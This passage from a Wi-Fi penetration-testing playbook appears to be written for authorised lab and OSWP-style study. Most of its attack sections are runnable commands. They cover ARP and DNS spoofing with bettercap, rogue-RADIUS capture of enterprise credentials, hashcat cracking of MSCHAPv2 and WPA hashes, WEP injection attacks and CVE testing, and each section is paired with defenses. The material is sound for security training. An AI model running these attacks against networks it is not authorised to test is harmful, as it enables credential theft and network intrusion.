net.probe off           # <-- OFF before spoofing (the #1 mistake; they fight over the host table)
set arp.spoof.targets 192.168.50.20     # SCOPE IT (default = WHOLE subnet — never leave it in shared air)
set arp.spoof.fullduplex false          # half-duplex = poison only the client (fallback vs a DAI-protected gateway)
arp.spoof on                            # bettercap auto-enables ip_forward on Linux
# layer payload (all need the spoof live):
set dns.spoof.domains lab.example.test ; dns.spoof on
set net.sniff.output /root/lab.pcap ; net.sniff on
# teardown (restores correct ARP): arp.spoof off ; dns.spoof off ; net.sniff off ; q
# verify on victim: arp -a shows the REAL gateway MAC; internet works again
```

**sslstrip / HSTS reality (concept + defense only):** `set http.proxy.sslstrip true; http.proxy on`
mostly **fails** on modern browsers — **HSTS**, **HSTS preload** (no strip window on the first
connection), **HTTPS-Only mode**. `hstshijack`'s homoglyph trick only bites misconfigured domains,
and its **JS payload/keylogger path is out of scope** — stop at *demonstrating the browser defeats
the downgrade*, then pivot to defense. Measure what still leaks under TLS: **SNI, DNS names (unless
DoH/DoT), IP/metadata**, any app that ignores cert validation.

**Gotchas:** `net.probe` OFF before `arp.spoof on`; `dns.spoof` sees nothing without `arp.spoof`;
default target = whole subnet; `fullduplex true` fails vs a DAI-protected gateway → half-duplex;
**Wi-Fi client isolation / guest mode blocks L2 peer traffic** → use a lab SSID without isolation;
mDNS/LLMNR/NBT-NS can bypass your DNS spoof (separate surface). **Defense:** **DAI + DHCP snooping**
(static ARP for critical hosts, `arpwatch`); **DoH/DoT + DNSSEC** (a DoH browser ignores your
`dns.spoof`); **HSTS preload + HTTPS-Only** (a preloaded site cannot be stripped — that's the
defense working); 802.1X port auth, VLAN/private-VLAN segmentation + client isolation.

---

## §10. WPA-ENTERPRISE / 802.1X EAP — CAPTURE THE INNER CREDENTIAL

**When:** airodump `AUTH = MGT`. The AP is a dumb relay; real auth is an **EAP** conversation to a
**RADIUS** server. The attacker sees only what the EAP method leaks, and **the one weakness
everything exploits is whether the supplicant validates the RADIUS server cert (correct CA +
correct server name, no user click-through).** This is the one place in advanced work with a
classic capture-and-crack win. (Rogue-RADIUS operation is **lab clients you own only**; no
credential-phishing portal is built here.)

| EAP method | eap.type | Leaks if you impersonate RADIUS |
|---|---|---|
| PEAP-MSCHAPv2 | 25 | username + MSCHAPv2 challenge/response → offline crack |
| EAP-TTLS/PAP | 21 | username + **cleartext password** (highest value, no cracking) |
| EAP-GTC | 6 | **cleartext password** (the downgrade target) |
| EAP-MD5 / LEAP | 4 / 17 | challenge/response on open air → `eapmd5pass` / `asleap`, no rogue AP |
| **EAP-TLS** | 13 | **nothing** — client cert required; immune. Report as a STRENGTH. |

```bash
# --- Recon: confirm Enterprise, ID method, harvest usernames (cleartext in Phase 1, before the tunnel) ---
sudo airodump-ng -c <ch> --bssid <AP> -w ent-recon wlan0          # ENC=WPA2 CIPHER=CCMP AUTH=MGT
sudo tcpdump -i wlan0 -w eap.pcap 'ether proto 0x888e'
sudo tshark -i wlan0 -Y eap -T fields -e wlan.sa -e eap.identity -e eap.type
eapmd5pass -r eap.pcap -w /usr/share/wordlists/rockyou.txt        # if EAP-MD5 offered: crack directly

# --- Rogue RADIUS capture (lab clients you own). Path A: hostapd-wpe (OSWP-standard) ---
sudo nano /etc/hostapd-wpe/hostapd-wpe.conf       # interface/ssid/channel; certs pre-wired
sudo airmon-ng check kill
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
#   logs username / 8B challenge / 24B response + a ready jtr NETNTLM line; TTLS/PAP prints the cleartext password

# --- Path B: eaphammer (auto-negotiates; GTC-downgrade) ---
./eaphammer --cert-wizard                                          # one-time self-signed RADIUS cert
./eaphammer -i wlan0 --channel 6 --auth wpa-eap --essid CorpWifi --creds   # MSCHAPv2 capture, any password strength
#   --negotiate balanced (default) | gtc-downgrade (cleartext if accepted) | manual --phase-1/2-methods
#   GTC-downgrade is LOUD -> EAP-NAK from hardened clients = a GOOD finding
```

**MSCHAPv2 crack (the payoff) — strength-independent by design.**
`NT=MD4(UTF-16LE(pw))` → padded to 21B → 3 DES keys; **K3 = 2 real bytes (2¹⁶, instant)**, K1+K2 =
a single **DES-56** problem → crackable regardless of password strength (Marlinspike & Ray, DEF CON
20). **MSCHAPv2 response == NetNTLMv1 → `hashcat -m 5500`.** You need: username (**exact inner
case** — it's SHA1'd into the ChallengeHash), the challenge, and the 24-byte NT-Response.

```bash
# Route A (preferred) — hashcat -m 5500. Field order: USER::DOMAIN:LM:NTRESP:SERVERCHALLENGE
echo 'bob:$NETNTLM$1a2b3c4d5e6f7a8b$aabbcc...' | sed -E 's/^(.*):\$NETNTLM\$(.*)\$(.*)$/\1::::\3:\2/'
hashcat -m 5500 -a 0 hash.txt rockyou.txt -r rules/best64.rule -O -w 3        # fast hash: rules/ORTTA before masks
hashcat -m 5500 -a 3 hash.txt '?u?l?l?l?l?l?d?d?s'                            # policy-shaped mask
# Route B — DES reduction (guaranteed): chapcrack parse -> $99$ token -> crack.sh (FPGA, DES-56 <=~26h)
#   -> NT hash -> hashcat -m 1000 for the report plaintext, or pass-the-hash. (crack.sh sends material off-box — scope decision.)
```

**Gotchas:** #1 is wrong 5500 field layout (don't swap the 48-hex response and 16-hex challenge; a
15-char challenge dropped a leading `0`); **5500 ≠ 5600** (5600 is NetNTLMv2); capture the **inner**
identity, not the anonymous outer; hostapd-wpe already computed the 8-byte ChallengeHash — use it
directly.

**Defense (the point of the section):** migrate PEAP/TTLS-MSCHAPv2 → **EAP-TLS** (client certs, no
password on the wire). If you must keep PEAP/TTLS: **enforce server-cert validation on every client
— pin the CA, specify the exact RADIUS server name (SAN DNS), forbid accepting new/unknown certs —
pushed by MDM/GPO/Intune**, never hand-configured; enable PEAP crypto-binding
(`crypto_binding = require`). A client with `ca_cert` + `domain_suffix_match` set correctly
**refuses every eaphammer/hostapd-wpe self-signed rogue** — that is the test's pass criterion and a
positive finding. Strong passwords slow but do **not** stop capture, the DES break, or
pass-the-hash. **IR:** rotate any credential that traversed an MSCHAPv2 exchange; treat NT-hash
exposure as full AD compromise.

---

## §11. WPA3-SAE — WHY OFFLINE DOESN'T APPLY

**Honest headline:** a correctly deployed **WPA3-Personal (SAE) network is not offline-crackable.**
SAE (Dragonfly PAKE) derives the PMK per-session — a captured exchange yields **nothing testable
offline**; **there is no hashcat mode for a WPA3-SAE PSK** (`hcxpcapngtool` emits no 22000 line for
pure SAE — "empty hc22000 on a modern AP" usually means WPA3-SAE or 802.11r FT-PSK). Guessing is
online-only, rate-limited, and PMF is mandatory so forged deauth can't force re-handshakes. **Any
"WPA3 crack" with `-m 22000` is attacking the WPA2 side of a transition-mode network.**

**Decision rule (timed event):** a pure WPA3-SAE target with no transition mode is **low-EV** —
note it and spend the minutes on a WEP/WPS/PSK target you can finish. The realistic opening:

```bash
# Identify transition mode (both PSK AND SAE present = downgrade surface):
sudo iw dev wlan0 scan | awk '/SSID:/{s=$2} /Authentication suites:/{print s": "$0}'
#   see BOTH :2 (PSK) and :8 (SAE) on one SSID -> attack the WPA2 side exactly as §5/§4:
sudo hcxdumptool -i wlan0 -w cap.pcapng -F
hcxpcapngtool -o target.22000 cap.pcapng
hashcat -m 22000 target.22000 rockyou.txt -r rules/best64.rule -w 3
```

**Dragonblood** (Vanhoef & Ronen 2019) = implementation + transition-design weaknesses, **not
"WPA3 cracked"** — see §14 for the CVE map and the **2024 follow-up (w1.fi 2024-2)** you must know
so you don't report "fixed in 2019." **"Pure SAE could not be offline-cracked" is a POSITIVE
finding** — the auditor's job on WPA3 shifts to config review: transition off? H2E on? hostapd/
wpa_supplicant **2.11+**? PMF required? **Defense:** WPA3-SAE only (disable transition once clients
support it), `sae_pwe=1` (H2E only, Dragonblood-safe), single `sae_groups=19`, `ieee80211w=2` +
`sae_require_mfp=1`, keep firmware current; SAE-PK for open/public impersonation.

---

## §12. CRACKING PLAYBOOK — TIERED (Mac GPU)

**Everything converges on `hashcat -m 22000` on the Mac** (Kali captures, the VM has no GPU). The
whole game: `PMK = PBKDF2(HMAC-SHA1, passphrase, ESSID, 4096, 256)` — irreversible, deliberately
slow (~185 kH/s band, not billions/s). **You cannot brute the full keyspace — candidate quality
and ordering are everything.** PSK length is 8–63 chars; anything < 8 is early-rejected.

```bash
# --- Fast path: crack-mac.sh (Mac) — pulls the capture from Kali, converts, tiered crack, stops on hit ---
"/Users/macbook/Ai agent /wifi-lab/crack-mac.sh"                 # level 1: weakpins, rockyou, 8-digit mask (~minutes)
"/Users/macbook/Ai agent /wifi-lab/crack-mac.sh" /tmp/cap-01.cap 2   # + rockyou x best66.rule + 10-digit mask
"/Users/macbook/Ai agent /wifi-lab/crack-mac.sh" /tmp/cap-01.cap 3   # + SecLists WiFi-WPA & big lists x rules (deep)
```

The script's engine (what to reproduce by hand): `hcxpcapngtool` convert → tiered
`hashcat -m 22000 -O -w 3` dict/mask calls, `--show` to detect a hit, stop immediately. It uses
`weakpins.txt`, `rockyou.txt`, `best66.rule`, and `wordlists-seclists/Passwords/WiFi-WPA/`.

**GPU environment (Apple Silicon = Metal, not OpenCL):**
```bash
hashcat -I                                   # list backends — match by NAME, not a number (numbering is unstable)
hashcat -b -m 22000 --backend-ignore-opencl  # YOUR real rate; Metal enumerates the GPU twice, they fight if both run
hashcat -m 22000 hash.hc22000 wl.txt --backend-ignore-opencl -w 3
```
- `-w 3` is the sweet spot; `-w 4` on a thermally-limited laptop clocks *down*. (Note current
  hashcat largely ignores `-w` — tune `-n`/`-u` if you need to; the scripts set `-w 3` harmlessly.)
- **`-O` on 22000 is effectively a no-op** (no optimized kernel; falls back to the pure kernel — the
  8–63-byte range is the kernel's own bound). `crack-mac.sh` passes `-O` harmlessly; it does **not**
  cap length here the way it would on fast hashes, but don't expect a speedup from it.
- "Not enough allocatable device memory" = unified-memory contention → close browsers/Final Cut/Docker.
- Keep PMKID + EAPOL for the same ESSID in **one** file (hashcat reuses the PBKDF2 across both).

**Candidate ordering — order by hit-probability ÷ cost.** Real recovered-key distribution (PACK,
10,737 WPA keys): **54% exactly 8 chars · 37% numeric-only · 29% are 8 digits · 20% word+digits ·
9% 8-lowercase.** Digits and 8-char dominate.

```
Stage 0  free structural masks (minutes). 8-digit alone ≈ 29% of real keys.
Stage 1  target-derived: ESSID tokens + OSINT list (highest ROI when you know context)
Stage 2  rockyou, length-pruned
Stage 3  rockyou + best64/best66 -> heavier rules
Stage 4  curated WPA corpora (wpa-sec cracked list = real PSKs people chose)
Stage 5  hybrids (word+digits ~20%)
Stage 6  structured brute, Markov-ordered — narrow, justified keyspaces ONLY
```
```bash
hashcat -m 22000 h.hc22000 -a 3 ?d?d?d?d?d?d?d?d                    # 8 digits
hashcat -m 22000 h.hc22000 essid-wordlist.txt -r rules/best66.rule
hashcat -m 22000 h.hc22000 rockyou.wpa.txt -r rules/best66.rule
hashcat -m 22000 h.hc22000 -a 6 rockyou.wpa.txt ?d?d?d?d            # hybrid word+digits
hashcat -m 22000 h.hc22000 -a 3 ?H?H?H?H?H?H?H?H                    # uppercase-hex ISP default
hashcat -m 22000 h.hc22000 --keyspace -a 3 <mask>                  # SIZE every mask BEFORE launching
```

**Time @ ~185 kH/s (≈1.6×10¹⁰ guesses/day) — scales linearly with GPU:**

| Mask | Keyspace | Time @185k | On an RTX 4090 (~2.4 MH/s) |
|------|----------|-----------|----------------------------|
| `?d`×8 | 10⁸ | **~9 min** | seconds |
| `?d`×10 | 10¹⁰ | **~15 h** | ~1.2 h |
| `?H`×8 (router hex) | 16⁸ ≈ 4.3B | **~6.4 h** | ~30 min |
| `?l`×8 | 26⁸ ≈ 2.1×10¹¹ | **~13 days** | <1 day |
| `?l?d`×8 | 36⁸ ≈ 2.8×10¹² | **~176 days** | ~2 weeks |
| rockyou × `?d?d?d?d` (`-a 6`) | 1.4×10¹¹ | **~8.9 days** | ~16 h |
| `?a`×8 | 95⁸ ≈ 6.6×10¹⁵ | **~1,100+ years** | ~90 yr |

**Takeaway:** all-digit ≤10 is tractable; 8-char lowercase borderline; **any mixed-alphanumeric ≥8
is effectively uncrackable** at Mac rates — which is exactly why mask *targeting* is the skill.
**Rule of thumb:** if a stage's keyspace ÷ your H/s exceeds the time you have, **skip it** and spend
the time on better lists. If 10-digit numeric + rockyou+rules + a few hybrids all fail, the
passphrase is probably strong — **stopping is the correct (defensive) conclusion**, not a cue to
brute `?a×8`. "Not recoverable by wordlist" is itself a finding.

**Wordlist tiers (smallest/most-probable first):** targeted/ESSID-derived/OSINT (tiny, decisive) →
**rockyou** (filter to 8–63 first: `awk 'length>=8 && length<=63'`) → WiFi-probable (SecLists
`WiFi/WPA`, berzerk0 Probable-Wordlists `WPA-Length/`) → wpa-sec cracked list → crackstation → the
monsters (marginal yield/hour). **More list ≠ more cracks.** Rules caveat: don't pre-drop short base
words if you'll run rules (a rule makes `timmy`→`timmy666`) — keep the raw list + `-S`, or
length-filter the rule *output*. Session hygiene: `--potfile-path ./proj.potfile` per engagement,
`--session=job1 --restore` + `-S` for resumable long runs, `--show`/`--left` to plan the next stage.

**OSINT lists (authorized target / own persona only; PII → lab dir, delete with engagement):**
CUPP (profile an individual), CeWL (scrape the target's own website for its vocabulary), Mentalist
(export **rules**, not a flat file). Human model: `[case base word] + [separator?] + [year/date] +
[special?]` (`Summer2023!`, `Linksys0788`). Filter to 8+ → run plain then `-r best66.rule` →
hybrids for date/phone tails → combinator for name×year.

---

## §13. TROUBLESHOOTING QUICK-REFERENCE

**First habit: bisect by STAGE before touching any flag.** A hashcat "No hashes" is never fixed at
the radio; an airodump "0 packets" is never fixed with a hashcat option.
```
CAPTURE (airodump/hcxdumptool) ──▶ CONVERT (hcxpcapngtool) ──▶ CRACK (hashcat -m 22000)
"0 APs / fixed chan -1 / no hs"     "0 EAPOL / 0 PMKID"          "No hashes / Token length / mode 2500 dead"
```
Master flow — run top-to-bottom, the first line that fails is your bug:
`rfkill list` → `ip link`/`iw dev` → `iw dev <if> info` → `airmon-ng check` → `iw list | grep monitor`
→ `airodump -c <ch> --bssid <AP> -w t <if>` → `aireplay-ng --test <if>` → `hcxpcapngtool -o t.hc22000 t.pcapng`
→ `hashcat -m 22000 t.hc22000 --show` → `hashcat -I ; hashcat -b -m 22000`.

| Symptom | Fix |
|---|---|
| `fixed channel wlan0mon: -1` | another process retuned → `check kill`; lock `-c`. **RTL8188EUS quirk:** driver reports channel oddly → if data flows it's cosmetic, add `--ignore-negative-one`; if data missing it's a real fight. |
| 0 APs / 0 packets | not actually monitor (`iw dev`); hopping (lock `-c`); **5 GHz target — invisible to this 2.4-only card**; power-save (`iw dev wlan0 set power_save off`); dropped USB passthrough (`dmesg\|tail`, `lsusb`). |
| `SIOCSIFFLAGS: Unknown error 132` | rfkill block → `rfkill unblock all`. |
| Injection "No Answer / 0 APs" | not a verdict: wrong/idle channel, not monitor, `check kill` not run, wrong RTL fork bound, regulatory cap, no APs in range (use card-to-card `-9 -i wlan1mon wlan0mon`). **En-dash gotcha:** web pages render `--test` as `—test` → retype two hyphens. |
| Handshake never appears | must be on the AP's exact channel; need a (re)connecting client; never `--ivs`; over-deauth starves it; `--bssid` filter can drop analysis pkts; confirm in Wireshark (`eapol`). |
| adapter vanished from VM | `fix-adapter.sh` (soft reset, no driver reload); if gone, `utmctl usb disconnect/connect Kali 2357:010C`. **Never `modprobe -r` a passed-through USB adapter** (drops passthrough). |
| hcxdumptool flaky in VM | out-of-tree driver → it may warn ("emulators/wrappers" = timing warning); prefer airodump+targeted deauth; keep hcxdumptool/hcxpcapngtool same version. |
| 0 EAPOL / 0 PMKID on convert | capture has no usable material — bug is upstream (§4/§5), not the converter. |
| Known-good password never cracks | nonce/packet-loss corruption (no NEC) → recapture cleaner, prefer M1+M2/M2+M3; or wrong ESSID in the hash; or `--add-timestamp` left an extra column (`awk '{print $1}' hash > clean`). |
| hashes gone after merging | never `cat`/`wpaclean`/merge **pcapng** — convert each separately; only `.hc22000` **text** is safe to `cat`. |
| hashcat "No OpenCL/HIP/CUDA platform" | no runtime; on Mac use native Metal build (`brew install hashcat`), not an x86 build under Rosetta. |
| `Token length exception` | wrong `-m`, **or the file path doesn't exist** (hashcat treats the filename as a hash) → verify path + `-m 22000`. |
| "No hashes loaded" | empty/all-filtered file (`wc -l`); **`-m 2500`/hccapx is dead** → convert to 22000 (don't `--deprecated-check-disable`). |
| "Unsupported Metal runtime" | `brew upgrade hashcat` / latest beta — **never `--force`**. |
| aircrack "No valid WPA handshakes" | wrong channel/mode at capture, interferer, `--ivs` used, or `--bssid` filter dropped ACKs → recapture. aircrack is CPU-only (~50–300 keys/s) — verify a handshake, then crack on the GPU. |

**Top time-sinks:** skipped `airmon-ng check kill` · `--ivs` on WEP/WPA · over-deauthed · merged/
`wpaclean`'d pcapng · hcxdumptool on a vif / alongside aircrack / after macchanger · brute a
full-charset 8-char mask without sizing keyspace · online WPS brute on a locked AP · **5 GHz target
+ 2.4-only card** · never verified the handshake before teardown · documented at the end and ran
out of time · following a `-m 2500` blog · source-built driver didn't survive a kernel upgrade (use
DKMS) · hard-killed the ARM64 VM and corrupted the disk.

---

## §14. MODERN CVEs — INTERVIEW DEPTH

The "advanced" layer you meet once PSK handshake-cracking is off the table. **None recovers the
PSK**; several need an on-path/MitM position; all are mostly **patch-state verification +
hardening** run against **your own** gear. **Retry every timeout — KRACK/Kr00k/FragAttacks all
under-report; one timeout = "inconclusive", never "safe."**

### KRACK — Key Reinstallation Attack (Vanhoef & Piessens, CCS 2017)
Tricks a victim into **reinstalling an in-use key** → resets the nonce (TX PN) and RX replay
counter → **keystream reuse → decrypt, replay, per-cipher forge.** Flaw in the **802.11 standard**
(every correct WPA2 impl affected). **Does not recover the PSK or session key** — changing the
Wi-Fi password does **not** mitigate it. Severe variant: `wpa_supplicant` **2.4/2.5** reinstall an
**all-zero TK** on a retransmitted Msg3 → trivial decrypt+inject; **2.6** via a forged Msg1 reusing
the ANonce. Cipher impact: CCMP = decrypt+replay; TKIP = +forge one direction; **GCMP = forge both
directions**. CVE family: **13077** (PTK-TK, 4-way, client) · 13078/13079 (GTK/IGTK, 4-way) ·
13080/13081 (Group Key) · **13082 (PTK-TK, FT/802.11r Reassoc, AP-side — no MitM, no Msg4 race —
the lab favourite, just replay the FT Reassociation Request)** · 13086–13088 (TDLS/WNM-Sleep). The
4-way case needs a channel-based MitM (two radios + CSA, drop Msg4). **2018:** power-save buffering
removed the race and beat first-round patches — **trust the behaviour, not the version string.**
Test with Vanhoef's `krackattacks-scripts` (disable hardware crypto first or results are silently
wrong; run `--replay-broadcast` clean before trusting `--group`; **Test 4 = the main 4-way check**;
`krack-ft-test.py` for 13082). **Defense:** patch **both** client (the important side) and AP to
**2.7+**; patches are backwards-compatible. PMF does **not** stop the data-plane 4-way reinstall.

### Dragonblood — WPA3-SAE (Vanhoef & Ronen 2019)
Implementation + transition weaknesses, **not "WPA3 cracked."** Map: **CVE-2019-9494** (H&P cache
side-channel, grp 19 — needs code on victim, patched by H2E) · 9494 timing (MODP 22/23/24 — **off by
default**, usually dead) · **CVE-2019-13377** (Brainpool timing) · **CERT VU#871675** = the
transition-mode downgrade → WPA2 (**the realistic win**), SAE group downgrade, and commit-flood DoS.
**2024 follow-up you MUST know (w1.fi 2024-2):** hostapd/wpa_supplicant **2.10** mishandle the
*Rejected Groups* element **even with H2E enabled** → group forced down; **wpa_supplicant defaults
to groups 19,20,21 → client exposed out of the box; fix = 2.11+.** Also current: **SSID Confusion
CVE-2023-52424.** Always fingerprint the **version**, not just "is it WPA3." EAP-pwd shares the
Dragonfly flaws (CVE-2019-9495/9497/9498/9499; FreeRADIUS 11234/11235/13456; tool Dragonslayer).
DoS PoCs dragondrain/dragontime are **Atheros-only** — not the RTL8188EUS. **Defense:** WPA3-only +
PMF, H2E (`sae_pwe` 1/2), single `sae_groups=19`, **2.11+**.

### Kr00k — CVE-2019-15126 (ESET 2020)
A vulnerable **Broadcom/Cypress FullMAC** chip, on **disassociation**, clears the TK to all-zeros
but still **transmits already-buffered TX frames under that all-zero key** → anyone in range
decrypts the few KB buffered at disassoc. Disassoc is cheap and forceable → loop *disassoc → flush →
decrypt*. ~1B+ devices (iPhone/iPad/Mac, many Androids, Echo, Kindle, Pi 3). Beyond-Kr00k: Qualcomm
**CVE-2020-3702** and MediaTek flush **cleartext**. **Realtek NOT implicated — the RTL8188EUS is the
testing radio, not a target class.** 2.4 GHz + WPA2-AES-CCMP only for the PoC (ESET script;
akabe1/kr00ker — success signal: decrypted payload begins with the RFC1042 SNAP header
`\xaa\xaa\x03\x00\x00\x00`; fill the buffer first with a download). **PMF does NOT fix Kr00k** (the
zero-key flush happens on any disassoc; PMF only makes forcing it harder — friction, not a cure).
**Defense:** firmware/OS update is the **only** real fix (ride TLS/VPN/SSH in the meantime; retire
never-patched chips).

### FragAttacks — 12 CVEs (Vanhoef, USENIX Security '21)
802.11 fragmentation + A-MSDU aggregation flaws → **packet injection**, under conditions
**exfiltration**. Affect **all protected Wi-Fi WEP→WPA3**, **auth-method-agnostic** (bugs live below
the key exchange). Three **design** CVEs hit basically everything — test first: **24588** (A-MSDU
unauthenticated is-aggregated flag), **24587** (mixed-key: reassemble fragments under different
keys), **24586** (fragment cache not cleared on reconnect). Nine impl CVEs (26139–26147) are the
trivial-to-exploit ones (plaintext accept, cloaked EAPOL A-MSDU, non-consecutive PN). Injection
buys: rogue DNS via ICMPv6 RA, NAT/firewall hole-punch, IoT control. **Card reality: the RTL8188EUS
can't do FragAttacks mixed mode** — use an Alfa **AWUS036ACM (mt76)**; AX200 is incompatible; kernel
≤5.12, 20 MHz channel. Test with Vanhoef's `fragattacks` (prove injection first; `TEST COMPLETED
SUCCESSFULLY` = vulnerable; `Test timed out! Retry` = retry before concluding). **Biggest myth to
correct: neither 802.11w/PMF nor EAP-TLS stops FragAttacks.** **Defense:** patch drivers/firmware/
OS/AP; HTTPS+HSTS makes transmitted data unstealable; harden what injection is *for* (host firewalls,
pinned DNS/DoH-DoT to block injected ICMPv6 RA, segment IoT); re-run the matrix after each patch.

---

## §15. DEFENSE MASTER TABLE — ATTACK → CONTROL → VERIFY

**One-line thesis:** *WPA3-only + PMF required + a long random passphrase (or 802.1X with real cert
validation) + WPS off + segmentation + a monitor-mode Kismet sensor = the attacker's entire
offline/downgrade/deauth toolkit stops working.*

| Attack | What closes it (does the real work) | Verify on the air |
|---|---|---|
| 4-way handshake offline crack (§4) | **WPA3-SAE / ≥20-char random PSK** (keyspace past centuries) | AKM=SAE; passphrase entropy audit |
| PMKID (§5) | WPA3-SAE / disable PMK caching + 802.11r / strong PSK | `hcxdumptool` on own AP yields no PMKID |
| WPS PIN / Pixie-Dust (§6) | **Disable WPS in firmware** (+ patch RNG / retire gear) | `wash` shows your BSSID **absent** |
| Deauth / DoS (§7) | **802.11w/PMF required** (`ieee80211w=2`); WPA3-SAE | deauth test leaves client associated |
| Evil-twin / downgrade (§8) | **WPA3-only + PMF** + Transition-Disable; client PNL hygiene / no auto-join; enterprise RADIUS cert validation / EAP-TLS | Kismet `APSPOOF`/`KARMAOUI`; allowlist diff; nzyme |
| MITM (§9) | **DAI + DHCP snooping**; **DoH/DoT + DNSSEC**; **HSTS preload + HTTPS-Only** | arpwatch; duplicate-address; a preloaded site can't be stripped |
| Enterprise EAP relay (§10) | **EAP-TLS** or pinned-CA PEAP/TTLS (MDM/GPO); strong creds | client profile locks CA + server name; rogue won't complete |
| WPA3-SAE PSK (§11) | Strong passphrase (online-only guessing) + single group + 2.11+ | no 22000 hash emitted = positive finding |
| KRACK / Kr00k / FragAttacks (§14) | **Patch** client + AP firmware/driver/OS | version audit ≥ fixed; re-run the PoC (PASS→FAIL) |

**Recurring truths:** (1) **802.11w/PMF + WPA3-SAE** is the single biggest hardening win across
deauth and evil-twin. (2) **Baseline then diff** — an allowlist of `ESSID,BSSID,CH,ENC,PMF` turns
rogue detection into a `comm`/`diff` one-liner. (3) Several "defenses" are **ineffective** and
should be recorded as such: MAC filtering (spoofable), SSID hiding (`mdk4 p` decloaks), VPN vs L2
deauth, WPS lockout vs Pixie, MAC randomization vs Karma. **Use the attacker's own tools as the
verifier** — `hcxdumptool` that yields no PMKID, `aireplay-ng --deauth` that doesn't drop the
client, `wash` that shows nothing — each is a green check that a control holds.

**Hardening runbook (top to bottom):** inventory & baseline → **patch everything** (closes KRACK/
Kr00k/FragAttacks/Dragonblood in one move) → **WPA3-only + PMF required** (`wpa_key_mgmt=SAE` *not*
`WPA-PSK SAE`, `rsn_pairwise=CCMP` never TKIP, `ieee80211w=2`, `sae_pwe=1`, `sae_require_mfp=1`;
legacy clients → their own VLAN'd SSID) → **kill WPS** (re-verify with `wash` after any reset) →
**real passphrase** (`openssl rand -base64 18 | tr -d '/+=' | cut -c1-20`) or 802.1X with pinned-CA
MDM profiles → **segment** (guest/IoT VLANs, `ap_isolate=1`, DHCP snooping/DAI wired-side) → stand
up `kismet -c wlan0` + nzyme → automate the daily drift audit → re-test from the attacker side.
**Gotchas:** "WPA3 enabled" but still transition mode; PMF "optional" (`=1`) ≠ protected but
`ieee80211w=2` kicks non-capable IoT (stage via `=1`); WPS checkbox lies / returns after reset;
`sae_pwe=0` re-opens Dragonblood; containment deauth is regulated — prefer detect-only.

---

## §16. BAND / CARD REALITY (NOTE IN EVERY REPORT)

The **RTL8188EUS is 2.4 GHz only** (ch 1–14). **All 5/6 GHz APs are invisible forever** — state it
as a coverage gap in every report, and confirm the target band from the beacon before burning time.
Right card for the job:

| Job | Card | Why |
|---|---|---|
| recon / monitor / injection / Kr00k (2.4 GHz) | **RTL8188EUS** (this rig) | out-of-tree DKMS driver, 2.4 only |
| guaranteed 2.4 GHz injection, zero driver drama | AR9271 (AWUS036NHA / WN722N **v1**) | `ath9k_htc`, gold standard |
| FragAttacks mixed mode + cleanest dual-band | **AWUS036ACM (mt76)** | the recommended mixed-mode card |
| dragondrain / dragontime (SAE DoS PoC) | Atheros (AWUS036NHA / WN722N v1) | `ath_masker` is Atheros-only |

**Buy the chipset, not the product name** — WN722N **v1 = AR9271** (great) vs **v2/v3 = RTL8188EUS**
(driver dance), same box. The RTL8188EUS does **none** of the 5/6 GHz or Atheros-only work.

## §App-WEP — WEP CRACKING (legacy, still OSWP-tested; deterministic, not guessing)

**When:** `ENC=WEP` on the scan. WEP falls to **IV volume**, not password guessing — gather enough unique
IVs and the key drops deterministically via PTW. Front-load it: minutes, guaranteed. Allowlist-gated.
**Rule of thumb:** ~20k IVs → 64-bit key, ~80k–200k+ → 128-bit, with `aircrack-ng -z` (PTW). Idle network?
You *generate* the traffic yourself (fake-auth + reinjection).

**0. Capture IVs (channel-locked, lean):**
```
sudo bash fix-adapter.sh
sudo airodump-ng -c <CH> --bssid <BSSID> -w wep --ivs wlan0     # watch the #Data column climb
```
**1. Fake authentication (associate so you can inject):**
```
sudo aireplay-ng -1 0 -a <BSSID> -h <YOUR-MAC> wlan0            # "Association successful :-)"
sudo aireplay-ng -1 6000 -o 1 -q 10 -a <BSSID> -h <YOUR-MAC> wlan0   # keep-alive variant
```
**2. Pump IVs — pick what applies:**
- **ARP replay (the workhorse):** `sudo aireplay-ng -3 -b <BSSID> -h <YOUR-MAC> wlan0` (deauth a real client once to seed an ARP).
- **No client / no ARP → recover a keystream, forge an ARP:**
  - ChopChop: `sudo aireplay-ng -4 -b <BSSID> -h <YOUR-MAC> wlan0` → `replay_dec-*.xor`
  - Fragmentation (faster when it works): `sudo aireplay-ng -5 -b <BSSID> -h <YOUR-MAC> wlan0` → `fragment-*.xor`
  - Forge + inject: `packetforge-ng -0 -a <BSSID> -h <YOUR-MAC> -k 255.255.255.255 -l 255.255.255.255 -y <xor> -w arp.cap` then `sudo aireplay-ng -2 -r arp.cap wlan0`
- **Interactive replay (-2):** replay any chosen captured packet.
**3. Crack live (re-run as #Data grows):**
```
aircrack-ng -z wep-01.ivs          # PTW (fastest). KEY FOUND! [ 1A:2B:3C:4D:5E ]
aircrack-ng -K wep-01.ivs          # KoreK fallback on stubborn captures
```
**4. Shared-Key Auth (SKA):** plain `-1` fails → capture a client's SKA handshake (deauth to force it;
airodump saves a `.xor` keystream), then `sudo aireplay-ng -1 0 -e <ESSID> -y sharedkey-*.xor -a <BSSID> -h <YOUR-MAC> wlan0`.
**5. Clientless (no AP, just a roaming victim client):**
- **Caffe-Latte:** `sudo airbase-ng -c <CH> -e <ESSID> -L -W 1 wlan0` (bounce flipped ARPs at the client, harvest its IVs → crack its stored key).
- **Hirte:** fragment variant (`-N`), works on more clients. Both attack the **client**, not the AP.
**Gotchas:** `airmon-ng check kill` first; keep `--ivs`; inject on the AP's exact channel.
**Defense:** WEP is unfixable — **retire it** (WPA2-AES/WPA3 only). Its presence on a scan *is* the finding.

## §App-ACCESS — PROVE ACCESS (the OSWP deliverable — don't stop at the key)

Recovering the key is half the job; you must **connect and demonstrate access** and capture the proof
(an IP on the target subnet + a ping to the gateway). Use the **built-in** Wi-Fi card to connect/prove and
keep the USB adapter for attacks — one radio can't associate and monitor at once.

**WPA/WPA2-PSK:**
```
wpa_passphrase "<ESSID>" "<PASSWORD>" > /tmp/wpa.conf
sudo wpa_supplicant -B -i wlan0 -c /tmp/wpa.conf
sudo dhclient wlan0 ; ip -br a show wlan0 ; ip r ; ping -c2 <GATEWAY>    # PROOF
```
or `nmcli dev wifi connect "<ESSID>" password "<PASSWORD>"`.

**WEP (recovered hex key):**
```
sudo iwconfig wlan0 essid "<ESSID>" key <HEXKEY> ; sudo dhclient wlan0 ; ip -br a ; ping -c2 <GATEWAY>
```
**WPA-Enterprise (cracked user creds):** a `wpa_supplicant` EAP block (`key_mgmt=WPA-EAP`, `eap=PEAP`,
`identity`, `password`, `phase2="auth=MSCHAPV2"`).

